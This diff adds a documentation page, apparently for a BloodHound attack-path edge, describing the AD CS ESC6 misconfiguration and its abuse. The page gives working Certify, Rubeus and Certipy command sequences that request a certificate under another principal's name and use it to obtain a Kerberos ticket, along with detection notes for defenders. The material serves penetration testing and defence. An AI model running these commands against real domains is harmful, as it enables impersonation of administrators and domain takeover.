@@ -1,0 +1,77 @@
+---
+title: ADCSESC6b
+description: The principal has permission to enroll on one or more certificate templates allowing for authentication.
+---
+
+
+<Frame>
+  <img src="/assets/image-2-1.png"/>
+</Frame>
+
+
+They also have enrollment permission for an enterprise CA with the necessary templates published. This enterprise CA is trusted for NT authentication in the forest, and chains up to a root CA for the forest. The enterprise CA is configured with the EDITF_ATTRIBUTESUBJECTALTNAME2 flag allowing enrollees to specify a Subject Alternate Name (SAN) identifying another principal during certificate enrollment of any published certificate template. This setup allows an attacker principal to obtain a malicious certificate as another principal. There is an affected Domain Controller configured to allow weak certificate mapping enforcement, which enables the attacker principal to authenticate with the malicious certificate and thereby impersonating any AD forest user or computer without their credentials.
+
+## Abuse Info
+
+### Windows
+
+Step 1: Use Certify to request enrollment in the affected template, specifying the affected certification authority and target principal to impersonate:
+
+```bash
+.\Certify.exe request /ca:rootdomaindc.forestroot.com\forestroot-RootDomainDC-CA /template:ESC6 /altname:ForestRootDA
+```
+
+If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default.
+
+Step 2: Convert the emitted certificate to PFX format:
+
+```bash
+certutil.exe -MergePFX .\cert.pem .\cert.pfx
+```
+Step 3: Use Rubeus to request a ticket granting ticket (TGT) from the domain, specifying the
+target identity to impersonate and the PFX-formatted certificate created in Step 2:
+
+```bash
+.\Rubeus.exe asktgt /certificate:cert.pfx /user:forestrootda /domain:forestroot.com /ptt
+```
+
+Step 4: Optionally verify the TGT by listing it with the klist command:
+
+```bash
+klist
+```
+
+### Linux
+
+Step 1: Use Certipy to request enrollment in the affected template, specifying the affected
+certification authority and target principal to impersonate:
+
+```bash
+ certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC6 -upn administrator@corp.local
+```
+If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default.
+
+Step 2: Request a ticket granting ticket (TGT) from the domain, specifying the certificate created in Step 1 and the IP of a domain controller::
+
+```bash
+certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128
+```
+
+## Opsec Considerations
+
+When the affected certificate authority issues the certificate to the attacker, it will retain a local copy
+of that certificate in its issued certificates store. Defenders may analyze those issued certificates to
+identify illegitimately issued certificates and identify the principal that requested the certificate, as
+well as the target identity the attacker is attempting to impersonate.
+
+## References
+
+This edge is related to the following MITRE ATT&CK tactic and techniques:
+
+* https://attack.mitre.org/techniques/T1649/
+
+### Abuse and Opsec references
+
+* Certipy 4.0
+* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
+* Domain Escalation Edit Attributes
